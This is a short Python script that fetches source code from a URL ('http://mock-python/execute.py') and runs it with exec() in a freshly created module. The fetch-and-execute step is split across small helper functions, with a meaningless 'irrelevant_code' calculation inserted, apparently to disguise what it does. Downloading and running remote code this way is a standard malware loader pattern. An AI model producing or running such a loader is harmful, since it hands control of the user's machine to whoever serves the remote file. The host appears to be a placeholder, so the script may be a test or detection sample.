import urllib.request
import types
import math

def get_url():
    return "http://mock-python/execute.py"

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def create_module():
    return types.ModuleType("sm")

def exec_code(src, module):
    exec(src, module.__dict__)

def main():
    url = get_url()
    source = get_response(url)
    irrelevant_code = math.pi * 2
    module = create_module()
    exec_code(source, module)

main()
